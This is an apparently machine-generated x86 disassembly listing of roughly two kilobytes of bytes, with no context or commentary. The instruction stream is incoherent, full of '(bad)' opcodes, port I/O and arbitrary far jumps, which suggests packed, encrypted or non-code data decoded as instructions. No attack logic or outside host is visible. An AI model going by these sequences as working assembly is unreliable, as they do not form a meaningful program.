  445c5d:	addr16 aam 0x9f
  445c60:	push   ds
  445c61:	adc    al,0x6e
  445c63:	fwait
  445c64:	out    0xc8,al
  445c66:	data16 cmp ch,BYTE PTR [edx+ebx*2-0x22]
  445c6b:	test   ch,ch
  445c6d:	stc    
  445c6e:	imul   edi,DWORD PTR [ebp+eax*8+0x53],0x5f898df6
  445c76:	in     eax,0x84
  445c78:	xor    DWORD PTR [eax],ecx
  445c7a:	cmp    al,0xcc
  445c7c:	nop
  445c7d:	add    al,dh
  445c7f:	xchg   esp,eax
  445c80:	ins    DWORD PTR es:[edi],dx
  445c81:	gs sahf 
  445c83:	sub    DWORD PTR [esi+0x67],ebp
  445c86:	pop    ds
  445c87:	mov    ecx,0xf11b9eb
  445c8c:	fcom   DWORD PTR [edi]
  445c8e:	push   0xffffffb1
  445c90:	cs loope 0x445c4c
  445c93:	aad    0x2c
  445c95:	add    al,0xfa
  445c97:	and    BYTE PTR [ebx],bh
  445c99:	outs   dx,BYTE PTR ds:[esi]
  445c9a:	ficomp WORD PTR [esi]
  445c9c:	lea    eax,[edi]
  445c9e:	jne    0x445ccf
  445ca0:	dec    ebp
  445ca1:	mov    dl,0xfd
  445ca3:	adc    eax,0xd47571e6
  445ca8:	push   ebp
  445ca9:	aad    0xbc
  445cab:	inc    eax
  445cac:	(bad)  
  445cad:	icebp  
  445cae:	retf   
  445caf:	aas    
  445cb0:	mov    BYTE PTR [ebx],bh
  445cb2:	cmp    DWORD PTR ss:[edx+0x2f],ebp
  445cb6:	or     al,0xa9
  445cb8:	int3   
  445cb9:	or     eax,0x6cfaaa1d
  445cbe:	ds sub al,0x48
  445cc1:	and    ecx,DWORD PTR [esi]
  445cc3:	dec    esi
  445cc4:	arpl   WORD PTR [eax+eiz*2-0x651e669b],ax
  445ccb:	lods   eax,DWORD PTR ds:[esi]
  445ccc:	ret    0x4600
  445ccf:	mov    esp,0xe4caa73d
  445cd4:	mov    eax,ds:0x25b91fba
  445cd9:	fst    DWORD PTR [ebp+0x64f9386a]
  445cdf:	aam    0xdd
  445ce1:	repz inc edi
  445ce3:	or     dl,bl
  445ce5:	cmp    al,BYTE PTR [eax+eax*4+0x2840b89]
  445cec:	pop    ebp
  445ced:	jne    0x445d14
  445cef:	das    
  445cf0:	fild   WORD PTR [edx]
  445cf2:	repnz sub BYTE PTR [eax],ah
  445cf5:	sub    eax,0xeac2c8fe
  445cfa:	pop    ds
  445cfb:	rcr    DWORD PTR [ebp+esi*1+0x5d264505],1
  445d02:	adc    ah,dl
  445d04:	ss out 0x8d,eax
  445d07:	pop    edi
  445d08:	ins    BYTE PTR es:[edi],dx
  445d09:	gs fcomi st,st(6)
  445d0c:	xchg   esp,eax
  445d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445d0e:	pop    esi
  445d0f:	cs dec edx
  445d11:	inc    edx
  445d12:	or     al,al
  445d14:	int3   
  445d15:	iret   
  445d16:	(bad)  
  445d17:	aad    0xb5
  445d19:	pop    ebx
  445d1a:	push   esi
  445d1b:	or     ch,bh
  445d1d:	mov    bl,BYTE PTR [edx]
  445d1f:	push   0xa4136f89
  445d24:	sub    al,0x2f
  445d26:	data16 in al,0x6
  445d29:	add    ah,BYTE PTR [ecx+eax*4+0x29a11600]
  445d30:	push   ebp
  445d31:	mov    ecx,0xbd644f6d
  445d36:	pop    ebp
  445d37:	(bad)  
  445d38:	leave  
  445d39:	jb     0x445da4
  445d3b:	xlat   BYTE PTR ds:[ebx]
  445d3c:	lock add al,al
  445d3f:	sub    ecx,DWORD PTR [ecx]
  445d41:	push   ebp
  445d42:	inc    edi
  445d43:	stos   DWORD PTR es:[edi],eax
  445d44:	loop   0x445d7a
  445d46:	push   ds
  445d47:	imul   ebp,DWORD PTR [ecx+0x55],0xff79c706
  445d4e:	(bad)  
  445d4f:	enter  0x251,0xc4
  445d53:	outs   dx,DWORD PTR ds:[esi]
  445d54:	dec    BYTE PTR [ecx-0x409972b1]
  445d5a:	pusha  
  445d5b:	rcr    DWORD PTR [edx+0x23],0xc5
  445d5f:	push   edx
  445d60:	fcom   DWORD PTR [edx+0x56]
  445d63:	pushf  
  445d64:	pop    ebp
  445d65:	imul   esp,DWORD PTR [ebp+0x41b60dd4],0x1f6d3278
  445d6f:	xchg   ebx,eax
  445d70:	fwait
  445d71:	aad    0xc7
  445d73:	sbb    ch,al
  445d75:	popa   
  445d76:	adc    dl,bh
  445d78:	adc    eax,0x77aace14
  445d7d:	xor    BYTE PTR [ebp+0x6b],ah
  445d80:	mov    ecx,ecx
  445d82:	loopne 0x445d54
  445d84:	inc    edx
  445d85:	test   al,0xea
  445d87:	adc    edx,DWORD PTR [edx+0x2]
  445d8a:	jo     0x445d2b
  445d8c:	lds    edx,FWORD PTR [edi+edx*2]
  445d8f:	dec    edx
  445d90:	ret    
  445d91:	retf   
  445d92:	pop    eax
  445d93:	fwait
  445d94:	add    al,0x60
  445d97:	out    dx,al
  445d98:	(bad)  
  445d99:	fst    QWORD PTR [eax+0x56479c3d]
  445d9f:	and    eax,0x73548590
  445da4:	pop    eax
  445da5:	xchg   ebp,eax
  445da6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445da7:	xor    al,0x95
  445da9:	mov    ds:0x42cad0a6,eax
  445dae:	outs   dx,DWORD PTR ds:[esi]
  445daf:	dec    edi
  445db0:	jp     0x445e20
  445db2:	xchg   esp,eax
  445db3:	aam    0x65
  445db5:	xor    BYTE PTR [ecx-0x46],dh
  445db8:	inc    esp
  445db9:	test   ebx,esi
  445dbb:	jae    0x445d46
  445dbd:	mov    bh,0x4b
  445dbf:	loope  0x445e2b
  445dc1:	mov    bl,0x34
  445dc3:	das    
  445dc4:	aam    0x5
  445dc6:	test   al,0xc0
  445dc8:	rol    edi,0x7f
  445dcb:	mul    BYTE PTR [eax]
  445dcd:	std    
  445dce:	pusha  
  445dcf:	cmp    edx,DWORD PTR [esi+0x63]
  445dd2:	retf   0xb079
  445dd5:	imul   edi,edi,0xffffff9a
  445dd8:	and    ah,BYTE PTR [esi+0x7e62d4e7]
  445dde:	(bad)  
  445ddf:	ficomp WORD PTR [ebx+0x5f]
  445de2:	inc    ebx
  445de3:	mov    DWORD PTR [edx-0x35],edx
  445de6:	sbb    al,0xd7
  445de8:	xor    al,0xcf
  445dea:	mov    bl,0x9c
  445dec:	jnp    0x445e6b
  445dee:	push   ds
  445def:	fild   WORD PTR [edx]
  445df1:	pop    esp
  445df2:	cdq    
  445df3:	sub    eax,0xd4f0c350
  445df8:	outs   dx,DWORD PTR ds:[esi]
  445df9:	mov    ebx,0xf8aa5a3c
  445dfe:	sti    
  445dff:	jmp    0xcc12:0xd488e7f4
  445e06:	es pop esp
  445e08:	test   al,0x34
  445e0a:	not    ebp
  445e0c:	xchg   edi,eax
  445e0d:	adc    eax,0x2d6a94b0
  445e12:	xor    eax,DWORD PTR [eax]
  445e14:	sub    BYTE PTR [edx+0x1c],al
  445e17:	dec    ebp
  445e18:	mov    bl,dl
  445e1a:	push   cs
  445e1b:	sbb    BYTE PTR [edx-0x448f1da4],0x24
  445e22:	cli    
  445e23:	cmp    ah,BYTE PTR [ebx+0x571f1815]
  445e29:	sbb    BYTE PTR [ecx+0x5e],0xa4
  445e2d:	lahf   
  445e2e:	or     edi,DWORD PTR [ebx-0x6a]
  445e31:	out    dx,eax
  445e32:	out    dx,eax
  445e33:	pop    ebp
  445e34:	inc    edx
  445e35:	inc    edx
  445e36:	add    DWORD PTR ds:0xbb528350,edi
  445e3c:	sub    al,0xcc
  445e3e:	lea    edi,ds:0x7eb0e8ce
  445e44:	scas   al,BYTE PTR es:[edi]
  445e45:	js     0x445e78
  445e47:	rol    eax,0x62
  445e4a:	into   
  445e4b:	sbb    ecx,DWORD PTR [eax-0x1f6c35f5]
  445e51:	loope  0x445eb7
  445e53:	lods   eax,DWORD PTR ds:[esi]
  445e54:	pop    ebx
  445e55:	add    cl,dl
  445e57:	xor    edi,edx
  445e59:	dec    eax
  445e5a:	add    cl,BYTE PTR [eax+0x2f1fe61c]
  445e60:	test   DWORD PTR [ecx-0x20],edx
  445e63:	push   ebp
  445e64:	loopne 0x445e91
  445e66:	stos   BYTE PTR es:[edi],al
  445e67:	aad    0x77
  445e69:	push   ebx
  445e6a:	call   0xc9047264
  445e6f:	(bad)
  445e73:	outs   dx,BYTE PTR ds:[esi]
  445e74:	pusha  
  445e75:	stos   DWORD PTR es:[edi],eax
  445e76:	pop    eax
  445e77:	(bad)  
  445e78:	sbb    eax,DWORD PTR [edx]
  445e7a:	out    0x7d,al
  445e7c:	into   
  445e7d:	sub    ah,ch
  445e7f:	xor    edi,DWORD PTR [ebx-0x14409f2a]
  445e85:	xchg   esp,eax
  445e86:	sub    BYTE PTR [edi+0x1a],dh
  445e89:	sti    
  445e8a:	xchg   edx,eax
  445e8b:	test   al,0x43
  445e8d:	push   cs
  445e8e:	add    eax,0x62bec33c
  445e93:	sub    esp,ecx
  445e95:	and    BYTE PTR [edx+0x28],0x69
  445e99:	jg     0x445e62
  445e9b:	push   0xffffffa0
  445e9d:	jne    0x445e89
  445e9f:	es mov eax,esp
  445ea2:	imul   ecx,DWORD PTR [edi-0x70],0x88d66df6
  445ea9:	mov    ecx,0x8c7a8691
  445eae:	rcr    DWORD PTR [ebx+0x1a],1
  445eb1:	add    ah,BYTE PTR [edx+0x16]
  445eb4:	fdivr  QWORD PTR [edx+0x73c301a4]
  445eba:	push   ds
  445ebb:	stc    
  445ebc:	add    DWORD PTR [ebx],esi
  445ebe:	sbb    al,0xe1
  445ec0:	add    al,0xff
  445ec2:	xlat   BYTE PTR ds:[ebx]
  445ec4:	inc    ecx
  445ec5:	popf   
  445ec6:	es jne 0x445f2d
  445ec9:	int3   
  445eca:	or     eax,0xaf0c1647
  445ecf:	jo     0x445e59
  445ed1:	sti    
  445ed2:	mov    ds:0x2d2c5585,al
  445ed7:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  445ed9:	dec    ebp
  445eda:	jp     0x445eb3
  445edc:	mov    BYTE PTR [ebx+0x66],ah
  445edf:	xor    al,0x42
  445ee1:	fistp  DWORD PTR [edx-0x2b]
  445ee4:	xchg   DWORD PTR ds:0x642776e8,ebx
  445eea:	and    dl,BYTE PTR [eax+0xedf918f]
  445ef0:	or     eax,0x1aa5a651
  445ef5:	xlat   BYTE PTR ds:[ebx]
  445ef6:	sbb    dl,dl
  445ef8:	loop   0x445f07
  445efa:	lahf   
  445efb:	(bad)  
  445efc:	je     0x445efb
  445efe:	inc    eax
  445eff:	je     0x445f73
  445f01:	jmp    0xb9e65025
  445f06:	aaa    
  445f07:	push   ss
  445f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445f09:	jecxz  0x445f72
  445f0b:	aad    0x67
  445f0d:	jge    0x445ef4
  445f0f:	xor    al,0x96
  445f11:	(bad)  [edx+ebp*2-0x78]
  445f15:	mov    ebp,0x81c5d95d
  445f1a:	dec    eax
  445f1b:	nop
  445f1c:	sahf   
  445f1d:	push   ebp
  445f1e:	mov    eax,0xa388d6dc
  445f23:	leave  
  445f24:	mov    edx,ebp
  445f26:	fldcw  WORD PTR [eax-0xb8b149]
  445f2c:	imul   edi,DWORD PTR [edx],0x7b
  445f2f:	outs   dx,DWORD PTR ds:[esi]
  445f30:	iret   
  445f31:	arpl   WORD PTR [esi],sp
  445f33:	push   esp
  445f34:	mov    BYTE PTR [eax-0x6],dl
  445f37:	mov    bh,0x75
  445f39:	add    ebp,eax
  445f3b:	sbb    eax,edx
  445f3d:	mov    dh,0xdb
  445f3f:	pop    esp
  445f40:	xchg   esi,eax
  445f41:	xchg   edx,eax
  445f42:	jnp    0x445f49
  445f44:	push   eax
  445f45:	rcl    dl,0x14
  445f48:	sti    
  445f49:	jbe    0x445f0e
  445f4b:	push   0xffffffcf
  445f4d:	jb     0x445ef3
  445f4f:	mov    bh,0x88
  445f51:	pop    di
  445f53:	cs mov ebp,0x88e889b2
  445f59:	div    DWORD PTR [esp+edi*1+0x27eaf9a7]
  445f60:	fisttp WORD PTR [ebp-0x377de21]
  445f66:	or     ah,BYTE PTR [edi-0x542ed9c3]
  445f6c:	xchg   BYTE PTR [ebp-0x5c48d8d9],ah
  445f72:	pop    ds
  445f73:	jmp    0x8c8a:0x408ae8c7
  445f7a:	pop    esi
  445f7b:	das    
  445f7c:	cli    
  445f7d:	add    al,BYTE PTR [ebp+0x111172f6]
  445f83:	pop    edi
  445f84:	xchg   DWORD PTR [ecx+0x4f3806a6],esi
  445f8a:	lahf   
  445f8b:	push   cs
  445f8c:	cs sbb eax,0xd760d5c2
  445f92:	imul   ebx,DWORD PTR [ecx],0x69c774aa
  445f98:	and    BYTE PTR [edi-0x4f],0x23
  445f9c:	or     DWORD PTR [esp+ebp*2],esi
  445f9f:	shl    DWORD PTR [ebx-0x33b5f79],1
  445fa5:	pusha  
  445fa6:	mov    al,ds:0xfcc173bb
  445fab:	fcom   DWORD PTR [esi+ebx*4+0x1026995f]
  445fb2:	(bad)  
  445fb3:	fisttp DWORD PTR [esi+0x4e6cf09f]
  445fb9:	pop    edi
  445fba:	pop    ebp
  445fbb:	inc    edi
  445fbc:	pop    eax
  445fbd:	dec    ebp
  445fbe:	prefetch (bad)
  445fbf:	or     eax,0x7041cada
  445fc4:	sbb    al,al
  445fc6:	pusha  
  445fc7:	mov    ebx,0xc8041e62
  445fcc:	jl     0x445fba
  445fce:	pop    ds
  445fcf:	mov    bl,0xab
  445fd1:	outs   dx,DWORD PTR ds:[esi]
  445fd2:	add    ebp,esp
  445fd4:	call   0x14ee9dce
  445fd9:	out    0x19,al
  445fdb:	inc    ecx
  445fdc:	cmp    esp,DWORD PTR [ebx+0x61cecedb]
  445fe2:	fs (bad) 
  445fe4:	(bad)  
  445fe5:	cmc    
  445fe6:	lods   al,BYTE PTR ds:[esi]
  445fe7:	add    eax,0x50d6b276
  445fec:	mov    al,BYTE PTR [edx]
  445fee:	ss icebp 
  445ff0:	mov    ebp,DWORD PTR [ebx+0x50]
  445ff3:	ins    DWORD PTR es:[edi],dx
  445ff4:	jbe    0x446023
  445ff6:	addr16 int 0x9b
  445ff9:	xor    eax,0x4c8820cc
  445ffe:	mov    dh,ch
  446000:	dec    esi
  446001:	(bad)  
  446002:	xor    edi,edx
  446004:	mov    BYTE PTR [edx+0x758621c9],cl
  44600a:	cld    
  44600b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44600c:	(bad)  
  44600d:	sub    esp,DWORD PTR [eax+0x19]
  446010:	cli    
  446011:	out    dx,al
  446012:	mov    eax,DWORD PTR [ebp-0x54]
  446015:	push   eax
  446016:	xor    DWORD PTR [edx-0x5765c6c0],ebp
  44601c:	(bad)  
  44601d:	lds    ebx,FWORD PTR [ecx-0x18]
  446020:	mov    eax,0x9f9d60ce
  446025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446026:	idiv   BYTE PTR [esi-0xa]
  446029:	jns    0x446073
  44602b:	std    
  44602c:	arpl   WORD PTR [eax],ax
  44602e:	shr    BYTE PTR [eax+0x9],0x97
  446032:	jmp    0x81b:0x6cf06e0d
  446039:	(bad)  [edx+0x65d996ac]
  44603f:	pop    edx
  446040:	mov    DWORD PTR [edx],ecx
  446042:	pusha  
  446043:	mov    ch,0xbc
  446045:	dec    esp
  446046:	xchg   edx,eax
  446047:	mov    esp,0x5618037f
  44604c:	leave  
  44604d:	in     eax,0x6d
  44604f:	fwait
  446050:	pushf  
  446051:	sbb    bl,BYTE PTR [edi]
  446053:	add    eax,0x610bb1a
  446058:	test   BYTE PTR cs:[ebp+edx*8+0x690ed0d6],cl
  446060:	sub    ebx,DWORD PTR ds:0x9988ffc9
  446066:	and    DWORD PTR [ecx+eax*2-0x44],edx
  44606a:	enter  0x6ccb,0xf6
  44606e:	fwait
  44606f:	aam    0x1a
  446071:	fs sbb al,0x15
  446074:	adc    esp,DWORD PTR [esi+0x6588e9d7]
  44607a:	int    0x8e
  44607c:	or     bl,BYTE PTR [ebp+edx*2-0x5a]
  446080:	xchg   esp,eax
  446081:	jecxz  0x44607a
  446083:	aam    0xa0
  446085:	leave  
  446086:	inc    ebx
  446087:	in     eax,dx
  446088:	cld    
  446089:	adc    al,0x2f
  44608b:	mov    BYTE PTR [eax+0x4aa11f1],cl
  446091:	lea    ecx,[ebp+0x2b]
  446094:	hlt    
  446095:	add    cl,BYTE PTR [ebx+eiz*8]
  446098:	and    ecx,DWORD PTR ds:0xe9033743
  44609e:	pop    ds
  44609f:	retf   
  4460a0:	fs (bad) 
  4460a2:	mov    dl,0xc8
  4460a4:	xor    cl,BYTE PTR [edi+0x9]
  4460a7:	xlat   BYTE PTR ds:[ebx]
  4460a8:	cmp    eax,0x8a192445
  4460ad:	pop    ss
  4460ae:	pop    ss
  4460af:	rcl    DWORD PTR [esi+0x195e9beb],cl
  4460b5:	and    edi,0x56
  4460b8:	icebp  
  4460b9:	mov    ds:0x2d5c6c4,eax
  4460be:	sbb    ch,BYTE PTR [edi-0x67066d4d]
  4460c4:	adc    ebp,DWORD PTR [esi+ebx*1]
  4460c7:	jge    0x4460ab
  4460c9:	mov    al,0x5d
  4460cc:	pop    edx
  4460cd:	adc    eax,0x687faa9b
  4460d2:	loopne 0x44605b
  4460d4:	iret   
  4460d5:	mov    ds:0x246ddfc5,al
  4460da:	push   edi
  4460db:	sub    eax,0x276547d9
  4460e0:	mov    dh,0x59
  4460e3:	cmc    
  4460e4:	add    dh,BYTE PTR [esi+0x7a38d701]
  4460ea:	sbb    edx,DWORD PTR [edx]
  4460ec:	mov    ah,0x82
  4460ee:	inc    eax
  4460ef:	in     eax,0x88
  4460f1:	adc    ebp,ebx
  4460f3:	pushf  
  4460f4:	out    0xe3,eax
  4460f6:	mov    bh,0x37
  4460f8:	sbb    BYTE PTR [edx],al
  4460fa:	sub    cl,0xad
  4460fd:	dec    ecx
  4460fe:	jbe    0x446162
  446100:	jmp    0x44614e
  446102:	push   ds
  446103:	lahf   
  446104:	adc    esi,ebx
  446106:	div    BYTE PTR [ebx-0x31f55633]
  44610c:	je     0x446111
  44610e:	sahf   
  44610f:	ret    0xedb9
  446112:	or     BYTE PTR [edx-0x2c],ch
  446115:	jae    0x446121
  446117:	jnp    0x4460a1
  446119:	scas   eax,DWORD PTR es:[edi]
  44611a:	repz or al,0xa8
  44611d:	ss mov esi,0xe7ad9958
  446123:	xchg   esi,eax
  446124:	sbb    esp,edi
  446126:	pop    ds
  446127:	cmp    esi,edi
  446129:	lock jnp 0x446130
  44612c:	sub    ah,BYTE PTR [eax]
  44612e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44612f:	sbb    ebp,esi
  446131:	add    DWORD PTR [ebp+0x6d],esp
  446134:	je     0x44618a
  446136:	mov    ds:0xdc846634,al
  44613b:	aam    0xd8
  44613d:	cmc    
  44613e:	sbb    ch,BYTE PTR [ebx]
  446140:	push   edx
  446141:	inc    edi
  446142:	xor    edi,edx
  446144:	mov    DWORD PTR [edi-0x5f65d2d1],esp
  44614a:	jge    0x446125
  44614c:	(bad)  
  44614d:	out    dx,al
  44614e:	mov    eax,0x2d3f25d5
  446153:	mov    edi,DWORD PTR [edi-0x77c4a0a1]
  446159:	mov    edi,0x9bf1f16c
  44615e:	loope  0x44610d
  446160:	ret    
  446161:	add    eax,0x17604f9e
  446166:	(bad)  
  446168:	mov    WORD PTR [edx-0x65],ds
  44616b:	arpl   ax,cx
  44616d:	add    edx,esi
  44616f:	jo     0x4461ad
  446171:	call   0xd108:0x1338401c
  446178:	loopne 0x446113
  44617a:	adc    bl,BYTE PTR [eax+0x48]
  44617d:	push   0x179654a6
  446182:	movups XMMWORD PTR [eax+0x69d80a65],xmm1
  446189:	add    BYTE PTR [edx+0x4205a753],bl
  44618f:	(bad)  
  446190:	cmp    al,0x15
  446192:	hlt    
  446193:	sub    al,0x99
  446195:	aas    
  446196:	popa   
  446197:	shl    DWORD PTR [ebx-0x4e1d6371],1
  44619d:	fcomp  DWORD PTR [edx]
  44619f:	push   ebp
  4461a0:	imul   ebx,DWORD PTR [ebx+ecx*8+0x48f216c],0x609ab344
  4461ab:	mov    eax,0x4c1f2010
  4461b0:	pop    edi
  4461b1:	fstp   TBYTE PTR ds:[esi+0x7e8bc188]
  4461b8:	retf   
  4461b9:	test   esp,edx
  4461bb:	xchg   ebp,eax
  4461bc:	jnp    0x4461c1
  4461be:	ret    0x19b8
  4461c1:	leave  
  4461c2:	enter  0x3241,0x30
  4461c6:	ins    DWORD PTR es:[edi],dx
  4461c7:	push   fs
  4461c9:	mov    al,ds:0xf8a99133
  4461ce:	pop    eax
  4461cf:	dec    ebp
  4461d0:	pop    edi
  4461d1:	inc    esp
  4461d2:	or     al,0x93
  4461d4:	dec    eax
  4461d5:	and    ebp,0xffffff82
  4461d8:	cmp    ebx,DWORD PTR [ecx]
  4461da:	retf   
  4461db:	jo     0x446166
  4461dd:	movhps QWORD PTR [edx],xmm1
  4461e0:	sub    ebp,DWORD PTR [ebx-0x68]
  4461e3:	push   ecx
  4461e4:	icebp  
  4461e5:	loop   0x44622d
  4461e7:	xor    al,0x34
  4461e9:	pop    edi
  4461ea:	stc    
  4461eb:	(bad)  
  4461ec:	(bad)  
  4461ed:	sbb    esi,esp
  4461ef:	xchg   ecx,eax
  4461f0:	push   eax
  4461f1:	mov    al,ds:0x60e6ed94
  4461f6:	xor    dh,BYTE PTR [ebx-0x34e1c6b4]
  4461fc:	push   ds
  4461fd:	inc    edi
  4461fe:	adc    esi,esp
  446200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446201:	stos   DWORD PTR es:[edi],eax
  446202:	sbb    al,BYTE PTR [edi]
  446204:	test   BYTE PTR [eax],bl
  446206:	push   ds
  446207:	ja     0x446215
  446209:	xchg   edx,eax
  44620a:	pop    edi
  44620b:	data16 lahf 
  44620d:	pop    eax
  44620e:	jge    0x446195
  446210:	sti    
  446211:	mov    ch,0x7e
  446213:	adc    al,0x23
  446215:	neg    DWORD PTR [ecx+0x6e1fc9d2]
  44621b:	out    0xbc,eax
  44621d:	and    eax,0x29196e04
  446222:	adc    esi,DWORD PTR [ebx-0x77]
  446225:	icebp  
  446226:	mov    ch,0xcd
  446228:	cmp    BYTE PTR [esi],0x2b
  44622b:	ins    DWORD PTR es:[edi],dx
  44622c:	or     eax,0x86020870
  446231:	sti    
  446232:	and    dh,dl
  446234:	jno    0x4461b9
  446236:	cdq    
  446237:	inc    edi
  446238:	jp     0x446254
  44623a:	pop    ds
  44623b:	loope  0x4461d6
  44623d:	ja     0x44628e
  44623f:	outs   dx,WORD PTR ds:[esi]
  446241:	push   esp
  446242:	cld    
  446243:	imul   BYTE PTR [esi-0x2b883361]
  446249:	sub    BYTE PTR [esi+0x50],ch
  44624c:	pop    edi
  44624d:	pushf  
  44624e:	pusha  
  44624f:	sbb    ecx,DWORD PTR [edx+0x7123f214]
  446255:	push   eax
  446256:	arpl   ax,ax
  446258:	in     eax,dx
  446259:	add    cl,dl
  44625b:	stc    
  44625c:	aad    0x3e
  44625e:	pop    ecx
  44625f:	mov    edi,0xa010b194
  446264:	xchg   esp,eax
  446265:	cmp    eax,0xc5849d94
  44626a:	push   ecx
  44626b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44626c:	xor    ah,BYTE PTR [esi-0x68c86161]
  446272:	sub    al,0x54
  446274:	pop    es
  446275:	stos   BYTE PTR es:[edi],al
  446276:	repz jne 0x446256
  446279:	mov    edi,0x694ab91f
  44627e:	or     DWORD PTR [eax-0x5e0a1826],edx
  446284:	xchg   BYTE PTR [edx+0x2],al
  446287:	sbb    eax,esi
  446289:	add    dl,BYTE PTR [esi]
  44628b:	and    dl,BYTE PTR [ebx-0x762bfe81]
  446291:	pop    ds
  446292:	mov    ebp,DWORD PTR [edi-0x6696ac14]
  446298:	mov    eax,0x3cabd20e
  44629d:	adc    al,0xbe
  44629f:	mov    edi,0x99f1c5a3
  4462a4:	call   0xd089:0x725560f1
  4462ab:	xchg   esp,ebp
  4462ad:	xchg   esi,eax
  4462ae:	shl    eax,cl
  4462b0:	repz add eax,0x131dd76a
  4462b6:	add    DWORD PTR [edx],esp
  4462b8:	add    esi,ebx
  4462ba:	pop    ds
  4462bb:	sbb    esi,DWORD PTR [esi+0x1b]
  4462be:	xor    al,0x27
  4462c0:	rcr    DWORD PTR [ebx+0x37],cl
  4462c3:	mov    al,0xa3
  4462c5:	add    eax,0x63fca0f0
  4462ca:	lods   al,BYTE PTR ds:[esi]
  4462cb:	stos   BYTE PTR es:[edi],al
  4462cc:	jg     0x446269
  4462ce:	pusha  
  4462cf:	in     eax,dx
  4462d0:	dec    esi
  4462d1:	jp     0x534f512e
  4462d7:	aam    0x46
  4462d9:	sub    BYTE PTR cs:[edi+0x42e22d8c],dl
  4462e0:	mov    ebp,ecx
  4462e2:	mov    WORD PTR [esi-0x4c],fs
  4462e5:	xchg   DWORD PTR [edi],eax
  4462e7:	mov    eax,0xd5ac031d
  4462ec:	ror    BYTE PTR [ecx],1
  4462ee:	mov    ds:0x1f8b44e6,eax
  4462f3:	jecxz  0x446276
  4462f5:	add    DWORD PTR [eax+edx*2-0x2a7398f4],0xffffffb5
  4462fd:	ret    
  4462fe:	bound  esp,QWORD PTR [ecx+0x7d9801cd]
  446304:	mov    DWORD PTR [ecx-0x17],ecx
  446307:	mov    bl,0x9d
  446309:	mov    ebx,0x58236c4
  44630e:	sbb    ch,ah
  446310:	es ret 
  446312:	call   0x63379ed0
  446317:	pop    ebp
  446318:	push   ecx
  446319:	mov    DWORD PTR [ecx+ebp*4+0x35],ecx
  44631d:	xor    esi,ebx
  44631f:	fucomip st,st(0)
  446321:	test   DWORD PTR [eax+0x716e6ca1],ebx
  446327:	pop    es
  446328:	mov    cl,ch
  44632a:	pop    esi
  44632b:	dec    ebp
  44632c:	xchg   esi,eax
  44632d:	push   eax
  44632e:	or     al,0xfa
  446331:	add    bl,BYTE PTR [ecx+ebx*1]
  446334:	int3   
  446335:	loopne 0x44631a
  446337:	or     DWORD PTR [esi],edi
  446339:	sbb    DWORD PTR [esi],ebx
  44633b:	sti    
  44633c:	repz imul ebx,DWORD PTR [esi-0x7f27b991],0xe840fad4
  446347:	repnz cmp eax,0x893f4cce
  44634d:	xchg   edi,eax
  44634e:	lock lods al,BYTE PTR ds:[esi]
  446350:	pop    ebx
  446351:	in     eax,dx
  446352:	(bad)  
  446353:	paddq  mm0,QWORD PTR [edx]
  446356:	cmp    BYTE PTR [edx-0x3e],al
  446359:	dec    esp
  44635a:	aaa    
  44635b:	mov    dl,0x91
  44635d:	mov    ah,0x1f
  44635f:	stos   DWORD PTR es:[edi],eax
  446360:	sub    cl,dl
  446362:	mov    bh,0x4a
  446364:	clc    
  446365:	and    eax,0xdc1cd5e4
  44636a:	xor    esi,ecx
  44636c:	scas   eax,DWORD PTR es:[edi]
  44636d:	pushf  
  44636e:	nop
  44636f:	xchg   esp,eax
  446370:	mov    DWORD PTR [ecx+0x60e2a216],edi
  446376:	pop    ebx
  446377:	mov    ch,0xa1
  446379:	dec    edx
  44637a:	lods   al,BYTE PTR ds:[esi]
  44637b:	leave  
  44637c:	repz add eax,0x7cf748d8
  446382:	push   edi
  446383:	in     al,0x7c
  446385:	mov    edi,0xb4c13561
  44638a:	imul   esi,DWORD PTR [edi],0xa6ce1abd
  446390:	sub    al,0x8b
  446392:	in     eax,dx
  446393:	jbe    0xa5e8dd33
  446399:	inc    ebp
  44639a:	pop    ebp
  44639b:	loop   0x44637a
  44639d:	push   0x1e
  44639f:	imul   edx,DWORD PTR [ecx],0x9
  4463a2:	dec    eax
  4463a3:	call   0xd4d9b4c6
  4463a8:	loope  0x446377
  4463aa:	stc    
  4463ab:	mov    ecx,0xbcc01e24
  4463b0:	mov    eax,0x1c711fac
  4463b5:	push   cs
  4463b6:	icebp  
  4463b7:	loop   0x4463b1
  4463b9:	loop   0x446376
  4463bb:	aad    0x77
  4463bd:	xchg   DWORD PTR [ebx-0x1b0355d2],edi
  4463c3:	mov    bl,0x89
  4463c5:	push   ecx
  4463c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4463c7:	out    0xf2,al
  4463c9:	sbb    BYTE PTR [edx-0x7beaa96c],cl
  4463cf:	outs   dx,DWORD PTR ds:[esi]
  4463d0:	xlat   BYTE PTR ds:[ebx]
  4463d1:	jge    0x446437
  4463d3:	aam    0x62
  4463d5:	or     DWORD PTR [edx+0x35cf8887],0x917e2f78
  4463df:	data16 add BYTE PTR [edx+0x68],cl
  4463e3:	inc    edx
  4463e4:	and    eax,DWORD PTR [edx]
  4463e6:	(bad)  
  4463e8:	cmp    al,0xba
  4463ea:	(bad)  
  4463eb:	mov    WORD PTR [edx-0x4f780f33],es
  4463f1:	pop    edx
  4463f2:	mov    ah,0x54
  4463f4:	mov    dl,0x23
  4463f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4463f7:	out    0x88,al
  4463f9:	jg     0x446389
  4463fb:	cmp    BYTE PTR [edx+0x5fbdaf9f],al
  446401:	mov    ch,ch
  446403:	add    eax,0x3799608e
  446408:	fwait
  446409:	cld    
  44640a:	inc    eax
  44640b:	cli    
  44640c:	loopne 0x4463d2
  44640e:	pop    ds
  44640f:	jne    0x446417
  446411:	arpl   WORD PTR [eax-0x66],dx
  446414:	out    dx,eax
  446415:	in     eax,0x78
  446417:	pop    ebx
  446418:	loop   0x4463ba
  44641a:	bound  eax,QWORD PTR [eax-0x598234b5]
  446420:	mov    ds:0x8868b09d,eax
  446425:	das    
  446426:	pop    ds
  446427:	inc    edx
  446428:	int3   
  446429:	hlt    
